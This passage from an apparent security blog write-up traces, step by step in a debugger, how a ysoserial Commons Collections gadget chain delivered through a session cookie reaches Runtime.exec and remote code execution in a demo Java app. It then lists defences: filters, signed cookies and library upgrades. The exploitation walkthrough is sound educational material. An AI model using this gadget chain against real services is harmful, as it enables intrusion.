![debug2_tiedmapentry_get.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_tiedmapentry_get.png?alt=media&token=74de8010-b9c8-49b1-afd7-a795bd85037e)

Because map is a `LazyMap`, `LazyMap.get("foo")` is activated:
![debug2_lazymap_get.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_lazymap_get.png?alt=media&token=bd2e7e7a-ebd9-4c00-92b3-e55207c9432e)

Here, the code checks whether the key `"foo"` exists, and because the map here is an empty `HashMap`, which is the `innerMap` object mentioned above, the key doesn't exist, so it activates `factory.transform(key)` with factory being a `ChainedTransformer` (the `transformers` object in ysoserial) leading to the activation of `ChainedTransformer.transform()`:
![debug2_chainedtransformer_transform.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_transform.png?alt=media&token=d6b85809-de79-4a09-b610-7e0dd7fce46e)

`iTransformers[]` in `ChainedTransformer` is an array containing `Transformer` interfaces. These objects are typically concrete classes like `ConstantTransformer` or `InvokerTransformer`, used to perform a series of transformations on the input data.

`iTransformer[]` in this gadget-chain is set for values sequentially from 0 - 4 as shown in the image above. The for loop in the `ChainedTransformer.transform()` method iterates through the `iTransformers` array, successively calling the `transform()` method of each element. The initial input value is passed to the first Transformer, then the result of each call is used as input for the next Transformer.

The Transformer chain proceeds as follows:

- `i = 0`, `object = "foo"`:

  The first Transformer is a `ConstantTransformer`, the value passed in (object) is `"foo"`.
  ![debug2_chainedtransformer_loop_0.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_0.png?alt=media&token=7858f07f-5acb-4c1f-b0dd-4e01f0eec105)

  The `transform` method of the `ConstantTransformer` class only receives input without processing it, just returning the `iConstant` that was set up when creating the payload.
  ![debug2_chainedtransformer_loop_0_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_0_1.png?alt=media&token=39dd5f01-40b5-4bcb-8ae5-fee618b650e8)
  When the first loop ends, `object` is `java.lang.Runtime` or `Runtime.class`.

<br>

The next 3 Transformers are `InvokerTransformer`. `InvokerTransformer` is a class in the Apache Commons Collections library that implements the `Transformer` interface. Its main function is to call a `method` on an `object` using the `Java Reflection API`.

The `Java Reflection API` is a collection of `classes` and `interfaces` in the `java.lang.reflect` package, allowing programs to inspect and manipulate `classes`, `methods`, `fields`, `constructors` at `runtime`, even when detailed information about them is not known in advance.

Here, the `Java Reflection API` is used to indirectly call a method. This API allows calling a method of any class. An example of invoke can get a method from another class:
![debug2_chainedtransformer_loop_1_6.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_1_6.png?alt=media&token=41f09ea6-e076-4455-8f38-57b9955468f5)

With the conventional way:

![debug2_chainedtransformer_loop_1_7.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_1_7.png?alt=media&token=a61596b2-5d75-40ac-b2e3-1479a7f45b7f)

Using Reflection:
![debug2_chainedtransformer_loop_1_8.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_1_8.png?alt=media&token=006e8f73-205d-4be9-926e-f316dda30a6e)
That is, `method.invoke(obj, param)` is equivalent to `obj.method(param)`

- `i = 1`, `object = Runtime.class`:
  ![debug2_chainedtransformer_loop_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_1.png?alt=media&token=1d380e47-676d-4bf4-ab94-43e4fdb8944c)

  The `transform` method in `InvokerTransformer`:
  ![debug2_chainedtransformer_loop_1_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_1_1.png?alt=media&token=8a678aad-89f9-467e-929f-4f91f9ae6c81)

  Going into the analysis, the initial `input` is `object` (Runtime.class). The first if condition is not satisfied, so the program falls into the try block:
  ![debug2_chainedtransformer_loop_1_2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_1_2.png?alt=media&token=026da64e-ed3c-4593-b864-7488abfdc693)

  - `Class cls = input.getClass()`:

    The `getClass()` method helps get the class of the object, here `input` is `Runtime.class` so `cls` will be class `Class` or `Class.class`:
    ![debug2_chainedtransformer_loop_1_3.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_1_3.png?alt=media&token=4a5b228f-63d7-4ffd-9cc8-3bc8a6527e54)

  - `Method method = cls.getMethod(iMethodName, iParamType)`:

    The `getMethod()` method gets a method on a class.

    `cls` has the value `Class.class`.

    `iMethodName` is `"getMethod"`.

    `iParamType` is `Class[] { String.class, Class[].class }`.
    ![debug2_chainedtransformer_loop_1_4.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_1_4.png?alt=media&token=fcd32a12-ec1a-44b2-81d4-213707c6e037)

    It follows that `Method method = Class.class.getMethod("getMethod", Class[] { String.class, Class[].class })`, so `getMethod` will return the `getMethod` method of the `Class` class => `method` is `Class.getMethod`.
    ![debug2_chainedtransformer_loop_1_9.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_1_9.png?alt=media&token=9f9946f5-8aed-46e3-95d2-a22fe93f9cbd)

  - `return method.invoke(input, iArgs)`:

    `method` is `Class.getMethod`.

    `input` is `Runtime.class`.

    `iArgs` is `Object[] {"getRuntime", new Class[0] }`.
    ![debug2_chainedtransformer_loop_1_5.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_1_5.png?alt=media&token=2cc621c9-2ebe-4ac8-8990-1d72dffa71f0)

    With the final code using reflection, it can be understood as `Runtime.class.getMethod("getRuntime")`, the result returned is an object of type `Method` => `object` is the `getRuntime` method of the `Runtime` class.

<br>

- `i = 2`, `object` is `Method getRuntime()`:

  ![debug2_chainedtransformer_loop_2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_2.png?alt=media&token=a6e50d1a-79df-46e3-838f-8b49408e45b4)
  ![debug2_chainedtransformer_loop_2_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_2_1.png?alt=media&token=fbb7d130-6dda-4db7-9f06-b8533ef7ff98)

  - `Class cls = input.getClass()`:

    `input` is the `getRuntime` method, and `getRuntime` is an instance of the `Method` class, so `getClass()` will return the class `Method` => `cls` is the class `Method`:
    ![debug2_chainedtransformer_loop_2_2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_2_2.png?alt=media&token=2d4f4fff-e86f-4bc6-99b1-2fa0755e6f1d)

  - `Method method = cls.getMethod(iMethodName, iParamTypes)`:

    `cls` is `Method.class`.

    `iMethodName` is `invoke`.

    `iParamTypes` is `Class[] { Object.class, Object[].class }`.
    ![debug2_chainedtransformer_loop_2_3.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_2_3.png?alt=media&token=266cfc6d-0d82-471e-8691-7dfa99c1a0cd)
    It is equivalent to `Method.class.getMethod("invoke", Class[] { Object.class, Object[].class })`, will return the `invoke` method of the `Method` class => `method` is `Method.invoke()`
    ![debug2_chainedtransformer_loop_2_4.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_2_4.png?alt=media&token=bd4eb1b6-120b-44c9-86c3-f717dcf4e3df)

  - `return method.invoke(input, iArgs)`:

    `method` is `Method.invoke()`.

    `input` is `Method getRuntime()`.

    `iArgs` is `Object[] { null, new Object[0] }`.
    ![debug2_chainedtransformer_loop_2_5.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_2_5.png?alt=media&token=66d3e4fb-03f1-4447-9754-52afe350c41c)

    At this step, `method` is `Method.invoke()`, so the code can be understood as `getRuntime.invoke(null, null)`, which is executing `Runtime.getRuntime()`. When executed, it will call `Runtime.getRuntime()` and return an instance of `Runtime`. Meanwhile, at step `i = 1`, `object` was only the `getRuntime` method, that is, an `instance` of `Method`, not actually executed.

<br>

- `i = 3`, `object = Runtime.getRuntime()`:

  ![debug2_chainedtransformer_loop_3.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_3.png?alt=media&token=ac54a5eb-adf5-4490-9399-834f5f7a0546)
  ![debug2_chainedtransformer_loop_3_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_3_1.png?alt=media&token=90da3fd0-b653-4c34-9c0e-28c95007896b)

  - `Class cls = input.getClass()`:

    `input` is `Runtime.getRuntime()`, so `getClass()` will get the class of this method => `cls` is `Runtime.class`.
    ![debug2_chainedtransformer_loop_3_2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_3_2.png?alt=media&token=db319b77-0817-44a4-b3cc-22d4e774df8f)

  - `Method method = cls.getMethod(iMethodName, iParamTypes)`:

    `cls` is `Runtime.class`.

    `iMethodName` is `"exec"`.

    `iParamTypes` is `Class[] { String.class }`.
    ![debug2_chainedtransformer_loop_3_3.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_3_3.png?alt=media&token=d5be389f-0b1c-4364-804a-85adcf0a1604)

    `getMethod()` will get the `exec` method of the `Runtime` class => `method` is `Runtime.exec()`.
    ![debug2_chainedtransformer_loop_3_4.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_3_4.png?alt=media&token=4085910d-ee77-42de-8bc7-0c8456eb8d00)

  - `return method.invoke(input, iArgs)`:

    `method` is `Runtime.exec()`.

    `input` is `Runtime.getRuntime()`.

    `iArgs` is `execArgs` which is the command we want to execute.
    ![debug2_chainedtransformer_loop_3_5.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_3_5.png?alt=media&token=5ecb2aa8-53fa-490f-9db1-8ea46650b2ce)

    It will execute `Runtime.getRuntime().exec(execArgs)`
    ![debug2_chainedtransformer_loop_3_6.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_3_6.png?alt=media&token=86812753-67d6-4180-bf3c-2940f77289c4)

    and RCE
    ![debug2_chainedtransformer_loop_3_7.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_3_7.png?alt=media&token=4f721a99-6c61-4f21-a092-3726d9d70ded)
    This time, it returns an instance of `Process` representing the process just created.

<br>

The final Transformer is a `ConstantTransformer`

- `i = 4`, `object` is an instance of `Process`(UNIXProcess):

  ![debug2_chainedtransformer_loop_4.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_4.png?alt=media&token=fff014da-7040-41c9-b5ac-e51f4d20ee7a)

  `ConstantTransformer` returns a fixed value regardless of the input, so it returns 1 to end the Transformer chain, avoiding errors when no more actions are needed.
  ![debug2_chainedtransformer_loop_4_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_4_1.png?alt=media&token=6869a1a1-99c1-4e05-a4b9-f1df8b410f6e)

Next, when `i = 5`, the loop has gone through the entire `iTransformers` array, it returns `object` carrying the value of the last `Transformer` returned, which is `1`.
![debug2_chainedtransformer_loop_4_2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_chainedtransformer_loop_4_2.png?alt=media&token=7167cc93-bbe4-412b-bd70-08f94dfb4525)

At this point, back to `LazyMap`, `value` carries the value returned at the end of the Transformer chain, which is `1`, the key `"foo"` is added to the map (the `innerMap` object from the payload - a HashMap) and returns `value` (1).
![debug2_lazymap_putkey.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fdebug2_lazymap_putkey.png?alt=media&token=ced0e6d4-0889-4d91-8e19-df4e54d0ce1e)

To TiedMapEntry, the 2 methods `getKey()` and `getValue` are done
![tiedmapentry_return.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Ftiedmapentry_return.png?alt=media&token=e433bad1-0ea9-4344-8b1e-de688263aa68)
`getKey()` returns `"foo"`, `getValue()` returns `1` => `TiedMapEntry.toString()` returns `"foo=1"`

Next to `BadAttributeExpException`, now `val` will have the value `"foo=1"`
![val_value.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fval_value.png?alt=media&token=9e41a8bf-fab8-4bc2-943a-49bf4204d68a)

And finally back to `AuthController`, it returns the object that has been deserialized
![authcontroller_return.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fauthcontroller_return.png?alt=media&token=8bf73799-9b02-4b42-8cf9-1a131cc52a74)
and continues the application.
![web_running.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Fweb_running.png?alt=media&token=e9ee91c6-43c1-46ac-a387-a2672ea5485c)

On the web page, "Invalid Cookie" appears, but we have successfully exploited it.
![invalid_cookie.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2F37d7c6c6-6420-4631-a46f-f2a246db8069%2Finvalid_cookie.png?alt=media&token=030f0217-3f21-484a-ae5a-098cbecea823)

---

# **7. Prevention Measures**

After analyzing the `insecure deserialization` vulnerability and how it leads to RCE in the demo application, implementing prevention measures is extremely important to protect systems from similar attacks. Below are detailed prevention methods, applied directly to this application and extendable to other Java applications.

## **7.1. Avoid Using Deserialization for Untrusted Data**

The current application uses `ObjectInputStream.readObject(`) to directly deserialize the `user_session` cookie from user-provided data without any checks.

Instead of `serializing` and `deserializing` the username in a cookie, use a more secure session management mechanism such as `JSON Web Token (JWT)` or a session ID that is encrypted and signed by the server.

## **7.2. Limit Classes Allowed to Deserialize**

Currently, the `deserializeFromBase64` method allows deserializing any class that implements Serializable, leading to attackers being able to insert a gadget chain.

If deserialization is mandatory, use ObjectInputFilter (available from Java 9, but can be backported to Java 8) to whitelist classes allowed to deserialize.

## **7.3. Use Cookie Authentication and Encryption Mechanisms**

The `user_session` cookie contains an unprotected serialized value, easily changed by attackers.

A solution could be to add an `HMAC (Hash-based Message Authentication Code)` signature to the cookie value to ensure integrity.

## **7.4. Update and Remove Vulnerable Libraries**

The application uses `commons-collections:3.1`, an old version that has been publicly known to have bugs containing gadget-chains leading to RCE.

Upgrade to newer versions like commons-collections4 (e.g.: 4.4), which have removed and mitigated dangerous gadgets. Use newer Java versions like 17, 23.

Audit all dependencies with tools to detect outdated or vulnerable libraries.

## **7.5. Enhance Monitoring**

As in the demo application, deserialization errors are only printed to the stack trace (e.printStackTrace()), with no attack detection mechanism. We can add detailed logging to record deserialization errors and monitor abnormal behaviors.

Combine with a SIEM system to detect attack patterns such as sending large or unusual payloads.
